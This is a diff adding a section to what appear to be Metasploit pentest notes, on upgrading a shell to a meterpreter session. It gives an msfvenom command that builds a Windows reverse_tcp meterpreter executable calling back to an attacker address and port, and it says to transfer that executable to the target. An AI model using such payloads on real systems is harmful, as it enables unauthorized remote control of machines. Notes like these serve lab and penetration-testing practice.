@@ -15,6 +15,13 @@ ___
 
 ## Description:  
 
+### Getting meterpreter session from shell
+
+Use [revshells](https://www.revshells.com/) msfvenom session to generate a payload
+`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.95 LPORT=9001 -f exe -o reverse.exe`
+transfer the exe to the machine
+``
+
 ### Basics
 View categories
 `show -h`
